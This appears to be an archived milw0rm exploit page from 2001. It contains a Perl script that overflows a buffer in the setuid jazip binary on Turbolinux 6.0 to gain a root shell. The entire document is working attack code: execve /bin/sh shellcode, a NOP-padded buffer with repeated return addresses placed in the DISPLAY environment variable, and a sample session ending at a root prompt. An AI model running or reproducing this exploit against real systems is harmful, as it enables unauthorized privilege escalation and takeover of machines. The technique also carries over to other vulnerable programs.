<html><head><title>jaZip 0.32-2 Local Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl

## jaZip Exploit / Tested version: jaZip-0.32-2 / anno 2000
## &lt;teleh0r@doglover.com&gt; ||  http://teleh0r.cjb.net/ 
## Vulnerable: Turbolinux 6.0
##
## [teleh0r@localhost teleh0r]$ rpm -q jaZip
## jaZip-0.32-2
## [teleh0r@localhost teleh0r]$ ./jazip-exploit.pl
## Address: 0xbffff7ac
## bash#


$shellcode =                     # Shellcode by: Taeho Oh
    &quot;\xeb\x1f&quot;.                  #/* jmp 0x1f              */
    &quot;\x5e&quot;.                      #/* popl %esi             */
    &quot;\x89\x76\x08&quot;.              #/* movl %esi,0x8(%esi)   */
    &quot;\x31\xc0&quot;.                  #/* xorl %eax,%eax        */
    &quot;\x88\x46\x07&quot;.              #/* movb %eax,0x7(%esi)   */
    &quot;\x89\x46\x0c&quot;.              #/* movl %eax,0xc(%esi)   */
    &quot;\xb0\x0b&quot;.                  #/* movb $0xb,%al         */
    &quot;\x89\xf3&quot;.                  #/* movl %esi,%ebx        */
    &quot;\x8d\x4e\x08&quot;.              #/* leal 0x8(%esi),%ecx   */
    &quot;\x8d\x56\x0c&quot;.              #/* leal 0xc(%esi),%edx   */
    &quot;\xcd\x80&quot;.                  #/* int $0x80             */
    &quot;\x31\xdb&quot;.                  #/* xorl %ebx,%ebx        */
    &quot;\x89\xd8&quot;.                  #/* movl %ebx,%eax        */
    &quot;\x40&quot;.                      #/* inc %eax              */
    &quot;\xcd\x80&quot;.                  #/* int $0x80             */
    &quot;\xe8\xdc\xff\xff\xff&quot;.      #/* call -0x24            */
    &quot;/bin/sh&quot;;                   #/* .string \&quot;/bin/sh\&quot;   */


$ret = 0xbffff7ac;  # May have to be modified.
$len = 2100;
$nop = 'A';

if (@ARGV == 1) {
    $offset = $ARGV[0];
}

for ($i = 0; $i &lt; ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}

$buffer .= $shellcode;

print(&quot;Address: 0x&quot;, sprintf('%lx',($ret + $offset)), &quot;\n&quot;);
$new_ret = pack('l',($ret + $offset));
$buffer .= $nop x 3; # May have to be modified / 5 for Debian.

for ($i += length($shellcode); $i &lt; $len; $i += 4) {
    $buffer .= $new_ret;
}

if ($ENV{'DISPLAY'}) {
    delete($ENV{'DISPLAY'});
}

local($ENV{'DISPLAY'}) = $buffer;
exec(&quot;/usr/X11R6/bin/jazip&quot;);


# milw0rm.com [2001-01-25]</pre></html>